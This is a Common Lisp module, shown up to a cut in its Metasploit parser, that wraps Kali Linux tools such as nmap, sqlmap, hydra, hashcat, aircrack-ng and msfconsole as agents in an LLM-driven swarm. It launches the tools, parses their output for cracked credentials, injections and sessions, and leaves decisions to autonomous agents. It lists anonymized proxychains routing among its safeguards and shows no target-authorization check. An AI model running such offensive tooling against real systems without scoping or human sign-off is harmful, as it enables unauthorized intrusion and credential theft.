;;;; -*- Mode: Lisp; Syntax: ANSI-Common-Lisp; Base: 10 -*-
;;;
;;; KALI-INTERFACE.LISP — Kali Linux Security Tool Integration for LISPMIND
;;;
;;; ═══════════════════════════════════════════════════════════════════════════
;;;              THE SWARM'S ARSENAL: WRAPPING KALI'S TOOL ECOSYSTEM
;;; ═══════════════════════════════════════════════════════════════════════════
;;;
;;; This module bridges the LISPMIND orchestrator with Kali Linux's extensive
;;; suite of security and penetration testing tools. Every Kali tool — from
;;; the humble nmap to the mighty Metasploit — becomes a first-class agent
;;; citizen: monitored by the orchestrator, piped through telemetry, and
;;; capable of autonomous decision-making via the shadow agent pattern.
;;;
;;; DESIGN PHILOSOPHY
;;; ─────────────────
;;; Why wrap system binaries instead of using native Lisp libraries? Three
;;; reasons: (1) Kali's tools are battle-tested, regularly updated, and
;;; maintained by domain experts; (2) they represent decades of accumulated
;;; domain knowledge (nmap's OS fingerprinting database, aircrack-ng's
;;; attack algorithms) that would be impractical to reimplement; (3) the
;;; agent abstraction gives us unified lifecycle management, output parsing,
;;; and inter-agent communication regardless of what binary sits underneath.
;;;
;;; ARCHITECTURE OVERVIEW
;;; ─────────────────────
;;;   KALI-AGENT (subclass of AGENT)
;;;   ├── binary path    (/usr/bin/nmap, /usr/bin/msfconsole, ...)
;;;   ├── argument list  ("-sV" "-O" "--open" ...)
;;;   ├── process handle (UIOP:LAUNCH-PROGRAM return value)
;;;   ├── output buffer  (captured stdout/stderr as vector of strings)
;;;   ├── findings list  (structured parsed results)
;;;   └── tool-category  (:recon :exploit :crypto :wireless :web :social)
;;;
;;;   Shadow Agent Pattern
;;;   ├── SHADOW-OBSERVER  (spawns the tool, captures raw output)
;;;   └── SHADOW-ANALYST   (reads parsed output, consults LLM, decides)
;;;
;;;   Gossip Integration
;;;   ├── Topic: "swarm.kali.output"     — raw/structured tool output
;;;   ├── Topic: "swarm.kali.findings"   — discovered vulnerabilities
;;;   └── Topic: "swarm.kali.status"     — tool start/stop/health events
;;;
;;; SECURITY CONSIDERATIONS
;;; ───────────────────────
;;; Running penetration testing tools carries inherent risk. This module
;;; implements several safeguards:
;;;   1. The KALI-AGENT-REGISTRY tracks all running tools for audit.
;;;   2. The PROXYCHAINS wrapper enables anonymized routing.
;;;   3. Output buffers are size-capped to prevent memory exhaustion.
;;;   4. Process timeouts prevent runaway scans.
;;;   5. The orchestrator's restart policy handles tool crashes safely.
;;;
;;; "Every tool in Kali is a weapon. Every weapon in LISPMIND is an agent.
;;;  Every agent has a heartbeat, a purpose, and a healer watching its back."
;;;
;;; ═══════════════════════════════════════════════════════════════════════════

(in-package :lispmind)

;; ═══════════════════════════════════════════════════════════════════════════
;; Section 0: Special Variables — Configuration & Global Registry
;; ═══════════════════════════════════════════════════════════════════════════

(defvar *kali-agent-registry* (make-hash-table :test 'eq)
  "Global registry of all active KALI-AGENT instances.

Keys are agent IDs (gensyms), values are the KALI-AGENT instances themselves.
This registry is separate from the orchestrator's agent registry because
Kali agents have a distinct lifecycle: they wrap external OS processes and
require process-specific cleanup. The orchestrator's registry tracks ALL
agents (including Kali agents); this registry provides fast lookup for
Kali-specific operations.

Thread-safety: Protected by *kali-registry-lock*.

Typical usage:
  (gethash agent-id *kali-agent-registry*)  →  kali-agent instance or nil
  (list-active-tools)                        →  all running Kali agents")

(defvar *kali-registry-lock* (bt:make-lock "kali-registry")
  "Lock protecting *kali-agent-registry* and related operations.

Acquired by:
  • register-kali-agent   — when adding a new Kali agent
  • deregister-kali-agent — when removing a Kali agent
  • list-active-tools     — when enumerating all Kali agents
  • kill-all-tools        — when terminating all Kali agents")

(defvar *kali-default-timeout* 300
  "Default timeout in seconds for Kali tool execution.

Tools that run longer than this are candidates for graceful termination.
Individual tool wrappers can override this per-agent. A value of 300 (5
minutes) balances thoroughness with resource conservation.

Set to NIL to disable timeouts entirely (not recommended for autonomous
operation — a single hung nmap could block recovery indefinitely).")

(defvar *kali-output-buffer-max* 10000
  "Maximum number of lines to retain in an agent's output buffer.

When this limit is reached, the oldest lines are discarded (FIFO eviction).
This prevents memory exhaustion from verbose tools like tshark that can
produce thousands of packets per second. Each line is a string, so at
10,000 lines the typical memory footprint is ~2-5 MB per agent.")

(defvar *kali-binary-search-paths*
  '(#P"/usr/bin/" #P"/usr/sbin/" #P"/usr/local/bin/" #P"/opt/")
  "Directories to search for Kali tool binaries.

When a binary is specified by name alone (e.g., \"nmap\" instead of
\"/usr/bin/nmap\"), these paths are checked in order. The function
FIND-KALI-BINARY performs the lookup.")

(defvar *kali-gossip-topics*
  '(:swarm.kali.output :swarm.kali.findings :swarm.kali.status
    :swarm.kali.shadow-analysis :swarm.kali.threats)
  "Gossip topics used by the Kali integration module.

These topics are automatically registered when the Kali subsystem is
initialized. Agents and shadow pairs publish to these topics so that
remote LISPMIND nodes can observe tool activity across the swarm.

  :swarm.kali.output         — Raw or lightly-processed tool output lines
  :swarm.kali.findings       — Structured vulnerability findings
  :swarm.kali.status         — Tool lifecycle events (start/stop/crash)
  :swarm.kali.shadow-analysis — LLM-generated analysis of tool output
  :swarm.kali.threats        — Escalated threat indicators")

;; ═══════════════════════════════════════════════════════════════════════════
;; Section 1: Kali-Agent Class Definition
;; ═══════════════════════════════════════════════════════════════════════════
;;
;; The KALI-AGENT is the cornerstone of this module. It extends the base
;; AGENT class with slots specific to wrapping external system binaries.
;; Each Kali agent represents one running (or ready-to-run) OS process.
;;
;; A Kali agent can be in one of these tool-category domains:
;;   :RECON      — Reconnaissance and information gathering (nmap, dirb)
;;   :EXPLOIT    — Exploitation frameworks (metasploit)
;;   :CRYPTO     — Cryptanalysis and password cracking (john, hashcat)
;;   :WIRELESS   — Wireless network analysis (aircrack-ng, tshark)
;;   :WEB        — Web application testing (sqlmap, dirb)
;;   :SOCIAL     — Social engineering toolkit integration

(defclass kali-agent (agent)
  ((binary :initarg :binary
           :accessor agent-binary
           :documentation
           "The system binary path (e.g., /usr/bin/nmap).
            If a relative name is provided, FIND-KALI-BINARY resolves it
            against *kali-binary-search-paths*. Must be executable by the
            current user.")

   (args :initarg :args
         :initform '()
         :accessor agent-args
         :documentation
         "Default arguments for the binary, as a list of strings.
            These are combined with any extra arguments passed to RUN-TOOL.
            Example for nmap: '(\"-sV\" \"-O\" \"--open\")")

   (process :initform nil
            :accessor agent-process
            :documentation
            "The UIOP process handle returned by LAUNCH-PROGRAM.
            NIL when the tool is not running. This slot is used by
            STOP-TOOL and KILL-TOOL to manage the process lifecycle.

            CAUTION: Direct manipulation of this slot from outside the
            agent's methods can corrupt process state. Always use the
            provided STOP-TOOL and KILL-TOOL methods.")

   (output-buffer :initform (make-array 0 :fill-pointer 0 :adjustable t)
                  :accessor agent-output-buffer
                  :documentation
                  "Captured stdout/stderr lines from the tool process.
            This is a vector with fill-pointer, holding the most recent
            output lines (up to *kali-output-buffer-max*). Older lines
            are evicted when the buffer fills. Each element is a string.

            Access: Use GET-TOOL-OUTPUT for a safe copy, or read the
            buffer directly (it's only mutated by the agent's thread).")

   (output-stream :initform nil
                  :accessor agent-output-stream
                  :documentation
                  "The process output stream (stdout+stderr pipe).
            Set by RUN-TOOL when launching the process. Read by
            CAPTURE-OUTPUT in a non-blocking fashion. Closed and nil'd
            when the process terminates.")

   (last-output :initform nil
                :accessor agent-last-output
                :documentation
                  "The most recent line of output from the tool.
            Updated by CAPTURE-OUTPUT after each successful read.
            Useful for polling-based monitoring: if this value hasn't
            changed and the process is still running, the tool may be
            stalled.")

   (tool-category :initarg :tool-category
                  :initform :recon
                  :accessor agent-tool-category
                  :documentation
                  "Domain classification for this tool.
            One of :RECON :EXPLOIT :CRYPTO :WIRELESS :WEB :SOCIAL.
            Used by the orchestrator for capability-based task routing
            and by the shadow analyst for contextual analysis.")

   (target :initarg :target
           :initform nil
           :accessor agent-target
           :documentation
           "Primary target for this tool run.
            For recon tools this is typically a hostname or IP range.
            For exploit tools it's the target host/vulnerability.
            For crypto tools it may be a hash file path.
            Stored as a string for telemetry and gossip purposes.")

   (findings :initform '()
             :accessor agent-findings
             :documentation
             "Structured findings extracted from tool output.
            Each element is a plist representing a parsed finding:
              (:type :open-port :port 80 :service \"http\" :banner \"Apache\")
              (:type :vulnerability :severity :high :cve \"CVE-2021-...\")
            Populated by PARSE-FINDINGS as output is captured.
            Shadow analysts consume this list for decision-making.")

   (start-time :initform nil
               :accessor agent-start-time
               :documentation
               "Timestamp when RUN-TOOL was last invoked.
            Set to (LOCAL-TIME:NOW) at process launch. Used for timeout
            detection and elapsed-time reporting in telemetry.")

   (timeout :initarg :timeout
            :initform *kali-default-timeout*
            :accessor agent-timeout
            :documentation
            "Per-agent timeout in seconds. Overrides the global default.
            When elapsed time exceeds this value, the orchestrator's
            monitor loop may signal an EXTERNAL-TIMEOUT condition,
            triggering the agent's restart policy (typically :RETRY
            or :USE-FALLBACK).")

   (process-lock :initform (bt:make-lock "kali-process")
                 :reader agent-process-lock
                 :documentation
                 "Lock protecting the process, output-stream, and
            output-buffer slots. Acquired by RUN-TOOL, CAPTURE-OUTPUT,
            STOP-TOOL, and KILL-TOOL to prevent races between the
            capture thread and lifecycle management operations."))

  (:documentation
   "A Kali-Agent is an agent that wraps a system binary from the Kali Linux
tool ecosystem. It runs the tool under orchestrator supervision, captures
output in real-time, parses structured findings, and pipes everything to
the telemetry and gossip systems.

Lifecycle:
  1. CONSTRUCT  — MAKE-INSTANCE or a tool wrapper (MAKE-NMAP-AGENT, etc.)
  2. REGISTER   — The agent is added to the orchestrator's registry
                  and the Kali-specific *kali-agent-registry*
  3. LAUNCH     — RUN-TOOL spawns the OS process via UIOP
  4. CAPTURE    — CAPTURE-OUTPUT reads output in a background loop
  5. PARSE      — PARSE-FINDINGS extracts structured data from each line
  6. BROADCAST  — Output and findings flow to gossip topics and telemetry
  7. TERMINATE  — STOP-TOOL (graceful) or KILL-TOOL (force)
  8. CLEANUP    — Process handle closed, agent deregistered

Thread-safety:
  • The process-lock protects process state mutations.
  • The inherited agent-lock protects health, status, and strategy.
  • Output buffer reads are lock-free (only the agent's thread writes).
  • STOP-TOOL and KILL-TOOL acquire both locks in defined order to
    prevent deadlock.

Every Kali agent is also a full AGENT citizen: it has health, heartbeat,
strategy, restart policy, and can be healed by the orchestrator just like
any other agent. The default Kali strategy is 'run the tool and capture
output in a loop until completion or timeout.'"))

;; ═══════════════════════════════════════════════════════════════════════════
;; Section 2: Binary Discovery & Validation
;; ═══════════════════════════════════════════════════════════════════════════
;;
;; Before we can launch any tool, we need to find its binary on the system.
;; These utilities handle path resolution and executable verification.

(defun find-kali-binary (name)
  "Search for a Kali tool binary by name.

NAME is either:
  • An absolute pathname (starts with /) — returned as-is after verifying
    that the file exists and is executable.
  • A relative name (e.g., \"nmap\") — searched in *kali-binary-search-paths*.

Returns the absolute pathname if found, or NIL with a warning if not.

Examples:
  (find-kali-binary \"nmap\")        → #P\"/usr/bin/nmap\"
  (find-kali-binary \"/usr/bin/nmap\") → #P\"/usr/bin/nmap\"
  (find-kali-binary \"nonexistent\")   → NIL (with warning)

Thread-safety: This function does not mutate global state and is safe
to call from multiple threads concurrently."
  (cond
    ;; Absolute path: verify existence and executability
    ((and (stringp name) (char= (char name 0) #\/))
     (let ((path (pathname name)))
       (if (and (probe-file path)
                (sb-posix:s-isreg (sb-posix:stat-mode (sb-posix:stat path)))
                (zerop (sb-posix:access path sb-posix:x-ok)))
           path
           (progn
             (warn "[KALI] Binary ~A not found or not executable." name)
             nil))))
    ;; Relative name: search the path list
    ((stringp name)
     (block search
       (dolist (dir *kali-binary-search-paths*)
         (let ((candidate (merge-pathnames (pathname name) dir)))
           (when (and (probe-file candidate)
                      (zerop (sb-posix:access candidate sb-posix:x-ok)))
             (return-from search candidate))))
       (warn "[KALI] Binary ~A not found in search paths: ~A"
             name *kali-binary-search-paths*)
       nil))
    ;; Already a pathname object
    ((pathnamep name)
     (if (and (probe-file name)
              (zerop (sb-posix:access name sb-posix:x-ok)))
         name
         (progn
           (warn "[KALI] Binary ~A not found or not executable." name)
           nil)))
    (t
     (warn "[KALI] Invalid binary specification: ~A (type: ~A)"
           name (type-of name))
     nil)))

(defun verify-kali-binary (binary-path)
  "Verify that a binary path is suitable for execution.

Checks:
  1. File exists (PROBE-FILE)
  2. Is a regular file (not a directory or symlink to nowhere)
  3. Is executable by the current user (access(2) X_OK)

Returns the binary path if all checks pass, NIL otherwise.
This function is called by RUN-TOOL before attempting to launch a
process, providing a clear error message instead of an opaque
UIOP failure.

Example:
  (verify-kali-binary #P\"/usr/bin/nmap\") → #P\"/usr/bin/nmap\"
  (verify-kali-binary #P\"/nonexistent\")    → NIL"
  (handler-case
      (let ((expanded (truename binary-path)))
        (unless (and (sb-posix:s-isreg (sb-posix:stat-mode
                                        (sb-posix:stat expanded)))
                     (zerop (sb-posix:access expanded sb-posix:x-ok)))
          (warn "[KALI] Binary ~A is not executable." expanded)
          (return-from verify-kali-binary nil))
        expanded)
    (error (e)
      (warn "[KALI] Cannot verify binary ~A: ~A" binary-path e)
      nil)))


;; ═══════════════════════════════════════════════════════════════════════════
;; Section 3: Registry Management — Tracking All Kali Agents
;; ═══════════════════════════════════════════════════════════════════════════
;;
;; Every Kali agent must be registered before use and deregistered after
;; termination. These functions wrap the hash-table operations with proper
;; locking and gossip notifications so the swarm knows about tool activity.

(defun register-kali-agent (agent)
  "Register a KALI-AGENT in the global Kali agent registry.

Acquires *kali-registry-lock*, inserts the agent keyed by its ID, then
publishes a status event to the gossip topic :swarm.kali.status so that
remote nodes are informed of the new tool.

Parameters:
  AGENT — A KALI-AGENT instance (or subclass like SHADOW-OBSERVER).

Returns: The agent ID (a gensym).

Side effects:
  • Mutates *kali-agent-registry*
  • Broadcasts gossip message on :swarm.kali.status

Thread-safety: Lock-protected, safe from any thread.

Example:
  (let ((agent (make-nmap-agent \"192.168.1.1\")))
    (register-kali-agent agent))  →  AGENT-12345"
  (let ((id (agent-id agent)))
    (bt:with-lock-held (*kali-registry-lock*)
      (setf (gethash id *kali-agent-registry*) agent))
    ;; Notify the swarm
    (publish-message :swarm.kali.status
                     `(:event :tool-registered
                       :agent-id ,id
                       :binary ,(namestring (agent-binary agent))
                       :category ,(agent-tool-category agent)
                       :target ,(agent-target agent)
                       :timestamp ,(local-time:now)))
    id))

(defun deregister-kali-agent (agent)
  "Remove a KALI-AGENT from the global Kali agent registry.

If the agent has a running process, it is NOT terminated by this function —
call STOP-TOOL or KILL-TOOL first. This function merely removes the registry
entry and broadcasts a deregistration event.

Parameters:
  AGENT — A KALI-AGENT instance.

Returns: The agent ID if it was in the registry, NIL if not found.

Side effects:
  • Mutates *kali-agent-registry*
  • Broadcasts gossip message on :swarm.kali.status

Thread-safety: Lock-protected."
  (let ((id (agent-id agent)))
    (bt:with-lock-held (*kali-registry-lock*)
      (remhash id *kali-agent-registry*))
    (publish-message :swarm.kali.status
                     `(:event :tool-deregistered
                       :agent-id ,id
                       :timestamp ,(local-time:now)))
    id))

(defun lookup-kali-agent (agent-id)
  "Look up a Kali agent by its ID.

Parameters:
  AGENT-ID — A gensym (the value returned by AGENT-ID).

Returns: The KALI-AGENT instance, or NIL if not found.

Thread-safety: Lock-protected read."
  (bt:with-lock-held (*kali-registry-lock*)
    (gethash agent-id *kali-agent-registry*)))

;; ═══════════════════════════════════════════════════════════════════════════
;; Section 4: Core Tool Methods — Process Lifecycle Management
;; ═══════════════════════════════════════════════════════════════════════════
;;
;; These five methods form the operational core of the Kali integration:
;; RUN-TOOL launches the process, CAPTURE-OUTPUT drains its output,
;; PARSE-FINDINGS extracts intelligence, and STOP-TOOL/KILL-TOOL manage
;; termination. Together they implement the full lifecycle of a tool run.

(defmethod run-tool ((agent kali-agent) &rest extra-args)
  "Execute the Kali tool with full orchestrator supervision.

This method performs the following steps:
  1. Verify the binary exists and is executable.
  2. Combine default args with EXTRA-ARGS.
  3. Launch the process via UIOP:LAUNCH-PROGRAM with :OUTPUT :STREAM.
  4. Store the process handle in the agent-process slot.
  5. Set the agent status to :RUNNING and update heartbeat.
  6. Register the agent if not already registered.
  7. Publish a start event to the gossip system.
  8. Record a telemetry event.

Parameters:
  AGENT      — The KALI-AGENT to execute.
  EXTRA-ARGS — Additional command-line arguments appended after the
               agent's default args. These are strings passed directly
               to the binary.

Returns: The UIOP process info object, or NIL if launch failed.

Example:
  (let ((agent (make-nmap-agent \"192.168.1.0/24\")))
    (run-tool agent \"-p\" \"1-1000\" \"--max-retries\" \"2\"))

Error handling:
  • If the binary is not found, warns and returns NIL.
  • If UIOP:LAUNCH-PROGRAM fails, signals an error condition.
  • The orchestrator's restart policy will decide how to recover.

Thread-safety: Acquires the agent's process-lock and agent-lock.
  Safe to call from any thread; not safe to call concurrently on the
  same agent (the lock serializes attempts)."
  (let ((binary (verify-kali-binary (agent-binary agent))))
    (unless binary
      (warn "[KALI] Cannot run agent ~A: binary ~A not available."
            (agent-id agent) (agent-binary agent))
      (return-from run-tool nil))
    ;; Build the full argument list
    (let* ((all-args (append (agent-args agent) extra-args))
           (command (cons (namestring binary) all-args)))
      ;; Acquire locks in defined order: process-lock first, then agent-lock
      (bt:with-lock-held ((agent-process-lock agent))
        (bt:with-lock-held ((agent-lock agent))
          ;; If there's already a process, stop it first
          (when (agent-process agent)
            (ignore-errors
              (uiop:terminate-process (agent-process agent) :urgent t))
            (ignore-errors
              (close (agent-output-stream agent)))
            (setf (agent-process agent) nil
                  (agent-output-stream agent) nil))
          ;; Launch the new process
          (handler-case
              (let ((process-info
                     (uiop:launch-program command
                                          :output :stream
                                          :error-output :output
                                          :if-output-exists :supersede)))
                (setf (agent-process agent) process-info
                      (agent-output-stream agent)
                      (uiop:process-info-output process-info)
                      (agent-start-time agent) (local-time:now)
                      (agent-status agent) :running)
                ;; Register and notify
                (unless (lookup-kali-agent (agent-id agent))
                  (register-kali-agent agent))
                (publish-message :swarm.kali.status
                                 `(:event :tool-started
                                   :agent-id ,(agent-id agent)
                                   :command ,(format nil "~{~A ~}" command)
                                   :category ,(agent-tool-category agent)
                                   :target ,(agent-target agent)
                                   :timestamp ,(local-time:now)))
                (record-telemetry-event :kali-tool-started
                                        :agent-id (agent-id agent)
                                        :command command
                                        :category (agent-tool-category agent))
                process-info)
            (error (e)
              (setf (agent-status agent) :failed)
              (warn "[KALI] Failed to launch ~A: ~A" (agent-id agent) e)
              nil)))))))

(defmethod capture-output ((agent kali-agent))
  "Non-blocking read of the tool's output stream.

Reads all currently available lines from the process output stream,
storing each line in the agent's output buffer. For each line:
  1. Append to the output buffer (with eviction if at max capacity).
  2. Update the agent-last-output slot.
  3. Broadcast the raw line to gossip topic :swarm.kali.output.
  4. Call PARSE-FINDINGS to extract structured data.
  5. If a finding is detected, broadcast it to :swarm.kali.findings.
  6. Update the agent heartbeat.

This method is designed to be called repeatedly (e.g., in a background
thread or the agent's strategy function). It does NOT block — if no
output is available, it returns immediately with the count of lines
read.

Parameters:
  AGENT — The KALI-AGENT whose output to capture.

Returns: The number of lines read this invocation (0 if none available).

Example:
  ;; In an agent's strategy function:
  (defun nmap-strategy (agent)
    (loop while (eq (agent-status agent) :running) do
      (let ((n (capture-output agent)))
        (when (zerop n)
          ;; No output available; yield to other agents
          (sleep 0.1)))
      ;; Check if process has exited
      (unless (uiop:process-alive-p (agent-process agent))
        (setf (agent-status agent) :completed)
        (return))))

Thread-safety: Acquires the agent's process-lock for stream and buffer
  access. The agent-lock is NOT acquired — status changes should be done
  by the caller if needed."
  (let ((lines-read 0)
        (stream (agent-output-stream agent)))
    ;; Guard against nil stream (process not started or already stopped)
    (unless stream
      (return-from capture-output 0))
    (bt:with-lock-held ((agent-process-lock agent))
      (handler-case
          (loop
            ;; Non-blocking: only read if input is available
            (unless (listen stream)
              (return))
            (let ((line (read-line stream nil nil)))
              (unless line
                (return))
              (incf lines-read)
              ;; 1. Store in output buffer with size cap
              (vector-push-extend line (agent-output-buffer agent))
              (when (> (length (agent-output-buffer agent))
                       *kali-output-buffer-max*)
                ;; FIFO eviction: shift array left by 1000 lines
                (let ((buf (agent-output-buffer agent)))
                  (replace buf buf :start2 1000)
                  (decf (fill-pointer buf) 1000)))
              ;; 2. Update last-output
              (setf (agent-last-output agent) line)
              ;; 3. Broadcast raw output to gossip
              (publish-message :swarm.kali.output
                               `(:agent-id ,(agent-id agent)
                                 :line ,line
                                 :timestamp ,(local-time:now)))
              ;; 4. Parse for structured findings
              (let ((finding (parse-findings agent line)))
                (when finding
                  ;; 5. Accumulate finding and broadcast
                  (push finding (agent-findings agent))
                  (publish-message :swarm.kali.findings
                                   `(:agent-id ,(agent-id agent)
                                     :finding ,finding
                                     :timestamp ,(local-time:now))))))
        (end-of-file ()
          ;; Stream closed — process has likely exited
          nil)
        (error (e)
          (warn "[KALI] Output capture error for ~A: ~A"
                (agent-id agent) e))))
    ;; Update heartbeat (outside the process-lock for shorter critical section)
    (when (> lines-read 0)
      (setf (agent-heartbeat agent) (local-time:now)))
    lines-read))

(defmethod parse-findings ((agent kali-agent) line)
  "Parse a line of tool output for structured findings.

This is the generic method — it dispatches on the agent's tool-category
and binary to apply the appropriate parser. Each tool produces output in
its own format, so we use a TYPECASE on the binary name to select the
right parsing logic.

Parameters:
  AGENT — The KALI-AGENT that produced this line.
  LINE  — A string, one line of output from the tool.

Returns: A finding plist, or NIL if no finding was detected in this line.

Finding plist format:
  (:type <finding-type> :source <binary-name> :raw <original-line> ...)

The additional keys depend on the tool and finding type. See the
individual parser branches below for details.

Extensibility:
  To add a parser for a new tool, add a new branch to the TYPECASE
  below, or define a subclass of KALI-AGENT with its own PARSE-FINDINGS
  method specializing on that subclass."
  (let ((binary-name (pathname-name (agent-binary agent)))
        (target (agent-target agent)))
    (flet ((make-finding (type &rest extra-keys)
             `(:type ,type
               :tool ,binary-name
               :target ,target
               :raw ,line
               :timestamp ,(local-time:now)
               ,@extra-keys)))
      (cond
        ;; ─────────────────────────────────────────────────────────────────
        ;; NMAP: Port scanning and service detection
        ;; ─────────────────────────────────────────────────────────────────
        ((string-equal binary-name "nmap")
         (cond
           ;; Open port with service: "80/tcp open http"
           ((cl-ppcre:scan "\\d+/tcp\\s+open\\s+\\S+" line)
            (cl-ppcre:register-groups-bind
                (port state service)
                ("(\\d+)/tcp\\s+(open|closed|filtered)\\s+(\\S+)" line)
              (when (and port service)
                (make-finding :open-port
                              :port (parse-integer port)
                              :state (intern (string-upcase state) :keyword)
                              :service service))))
           ;; OS detection: "OS details: Linux 2.6.32"
           ((cl-ppcre:scan "OS details:\\s*(.+)" line)
            (cl-ppcre:register-groups-bind (os-details)
                ("OS details:\\s*(.+)" line)
              (make-finding :os-detection :os os-details)))
           ;; MAC address: "MAC Address: 00:11:22:33:44:55 (Vendor)"
           ((cl-ppcre:scan "MAC Address:\\s*([0-9A-Fa-f:]{17})" line)
            (cl-ppcre:register-groups-bind (mac)
                ("MAC Address:\\s*([0-9A-Fa-f:]{17})" line)
              (make-finding :mac-address :mac mac)))
           ;; Nmap scan summary: "Nmap done: 256 IP addresses"
           ((cl-ppcre:scan "Nmap done:" line)
            (make-finding :scan-summary :detail line))
           (t nil)))

        ;; ─────────────────────────────────────────────────────────────────
        ;; SQLMAP: SQL injection detection
        ;; ─────────────────────────────────────────────────────────────────
        ((string-equal binary-name "sqlmap")
         (cond
           ;; Vulnerability found: "Parameter 'id' is vulnerable"
           ((cl-ppcre:scan "(Parameter|Cookie|Header)\\s+'(.+)'\\s+is\\s+vulnerable" line)
            (cl-ppcre:register-groups-bind (param-type param-name)
                ("(Parameter|Cookie|Header)\\s+'(.+)'\\s+is\\s+vulnerable" line)
              (make-finding :sql-injection
                            :parameter-type param-type
                            :parameter param-name
                            :severity :critical)))
           ;; Injection type: "Type: boolean-based blind"
           ((cl-ppcre:scan "Type:\\s*(.+sql.+|.+injection.+)" line)
            (cl-ppcre:register-groups-bind (injection-type)
                ("Type:\\s*(.+)" line)
              (make-finding :injection-type :injection-type injection-type)))
           ;; DBMS identified: "back-end DBMS: MySQL"
           ((cl-ppcre:scan "back-end DBMS:\\s*(\\S+)" line)
            (cl-ppcre:register-groups-bind (dbms)
                ("back-end DBMS:\\s*(\\S+)" line)
              (make-finding :dbms-identified :dbms dbms)))
           (t nil)))

        ;; ─────────────────────────────────────────────────────────────────
        ;; HYDRA: Brute-force results
        ;; ─────────────────────────────────────────────────────────────────
        ((string-equal binary-name "hydra")
         (cond
           ;; Login found: "[80][http-post-form] host: 192.168.1.1 login: admin password: secret"
           ((cl-ppcre:scan "login:\\s*(\\S+)\\s+password:\\s*(\\S+)" line)
            (cl-ppcre:register-groups-bind (login password)
                ("login:\\s*(\\S+)\\s+password:\\s*(\\S+)" line)
              (make-finding :credential-found
                            :username login
                            :password password
                            :severity :critical)))
           ;; Service info: "[22][ssh] host: 192.168.1.1"
           ((cl-ppcre:scan "\\[(\\d+)\\]\\[(\\S+)\\]\\s+host:" line)
            (cl-ppcre:register-groups-bind (port service)
                ("\\[(\\d+)\\]\\[(\\S+)\\]\\s+host:" line)
              (make-finding :service-target :port port :service service)))
           (t nil)))

        ;; ─────────────────────────────────────────────────────────────────
        ;; JOHN / JOHN THE RIPPER: Password cracking
        ;; ─────────────────────────────────────────────────────────────────
        ((or (string-equal binary-name "john")
             (string-equal binary-name "johntheripper"))
         (cond
           ;; Cracked password: "user:password"
           ((cl-ppcre:scan "^(\\S+):(\\S+)\\s*$" line)
            (cl-ppcre:register-groups-bind (user password)
                ("^(\\S+):(\\S+)\\s*$" line)
              (make-finding :password-cracked
                            :username user
                            :password password
                            :severity :high)))
           ;; Session progress: "Session completed"
           ((cl-ppcre:scan "Session completed" line)
            (make-finding :session-completed :detail line))
           (t nil)))

        ;; ─────────────────────────────────────────────────────────────────
        ;; HASHCAT: GPU password cracking
        ;; ─────────────────────────────────────────────────────────────────
        ((string-equal binary-name "hashcat")
         (cond
           ;; Cracked hash: "hash:password"
           ((cl-ppcre:scan "^(\\S+):(\\S+)\\s*$" line)
            (cl-ppcre:register-groups-bind (hash password)
                ("^(\\S+):(\\S+)\\s*$" line)
              (make-finding :hash-cracked
                            :hash hash
                            :password password
                            :severity :high)))
           ;; Progress: "Progress: 45.2%"
           ((cl-ppcre:scan "Progress:\\s*([0-9.]+)%" line)
            (cl-ppcre:register-groups-bind (pct)
                ("Progress:\\s*([0-9.]+)%" line)
              (make-finding :crack-progress
                            :percentage (parse-float pct))))
           (t nil)))

        ;; ─────────────────────────────────────────────────────────────────
        ;; AIRCRACK-NG: Wireless analysis
        ;; ─────────────────────────────────────────────────────────────────
        ((string-equal binary-name "aircrack-ng")
         (cond
           ;; WEP cracked: "KEY FOUND! [ AA:BB:CC:DD:EE ]"
           ((cl-ppcre:scan "KEY FOUND!" line)
            (cl-ppcre:register-groups-bind (key)
                ("KEY FOUND!\\s*\\[\\s*([0-9A-Fa-f:]+)\\s*\\]" line)
              (make-finding :wep-key-recovered
                            :key key
                            :severity :critical)))
           ;; WPA handshake: "WPA handshake capture: XX:XX:XX:XX:XX:XX"
           ((cl-ppcre:scan "WPA handshake" line)
            (make-finding :wpa-handshake-captured :detail line))
           ;; IVs captured: "Read XXXXX packets"
           ((cl-ppcre:scan "Read\\s+([0-9,]+)\\s+packets" line)
            (cl-ppcre:register-groups-bind (count)
                ("Read\\s+([0-9,]+)\\s+packets" line)
              (make-finding :packets-read :count count)))
           (t nil)))

        ;; ─────────────────────────────────────────────────────────────────
        ;; TSHARK: Packet capture analysis
        ;; ─────────────────────────────────────────────────────────────────
        ((or (string-equal binary-name "tshark")
             (string-equal binary-name "wireshark"))
         (cond
           ;; Suspicious protocol: frame decode lines with interesting protocols
           ((cl-ppcre:scan "(SMB|NTLM|Kerberos|LDAP|SMB2)" line)
            (make-finding :protocol-detected
                          :protocol (cl-ppcre:scan-to-strings
                                     "(SMB|NTLM|Kerberos|LDAP|SMB2)" line)))
           ;; DNS query: "query: somedomain.com"
           ((cl-ppcre:scan "query:\\s*(\\S+)" line)
            (cl-ppcre:register-groups-bind (domain)
                ("query:\\s*(\\S+)" line)
              (make-finding :dns-query :domain domain)))
           (t nil)))

        ;; ─────────────────────────────────────────────────────────────────
        ;; DIRB: Directory brute-forcing
        ;; ─────────────────────────────────────────────────────────────────
        ((string-equal binary-name "dirb")
         (cond
           ;; Found directory: "+ http://target/admin (CODE:200|SIZE:1234)"
           ((cl-ppcre:scan "^\\+\\s+(http://.+)\\s+\\(CODE:(\\d+)" line)
            (cl-ppcre:register-groups-bind (url code)
                ("^\\+\\s+(http://.+)\\s+\\(CODE:(\\d+)" line)
              (make-finding :directory-found
                            :url url
                            :http-code (parse-integer code)
                            :severity (if (= 200 (parse-integer code))
                                          :info
                                          :medium))))
           (t nil)))

        ;; ─────────────────────────────────────────────────────────────────
        ;; PROXYCHAINS: Proxy routing wrapper (no parseable findings)
        ;; ─────────────────────────────────────────────────────────────────
        ((string-equal binary-name "proxychains")
         (cond
           ;; Proxy chain built: "S-chain|-<>-127.0.0.1:9050-<><>-target"
           ((cl-ppcre:scan "S-chain" line)
            (make-finding :proxy-chain-active :detail line))
           ;; Timeout: "timeout"
           ((cl-ppcre:scan "timeout" line)
            (make-finding :proxy-timeout :severity :warning))
           (t nil)))

        ;; ─────────────────────────────────────────────────────────────────
        ;; METASPLOIT: Exploitation framework
        ;; ─────────────────────────────────────────────────────────────────
        ;; Note: Metasploit output varies wildly. We parse common patterns.
        ((or (string-equal binary-name "msfconsole")
             (string-equal binary-name "msfvenom"))
         (cond
           ;; Session opened: "Meterpreter session X opened"
           ((cl-ppcre:scan "session\\s+(\\d+)\\s+opened" line)
            (cl-ppcre:register-groups-bind (session-id)
                ("session\\s+(\\d+)\\s+opened" line)
              (make-finding :session-opened
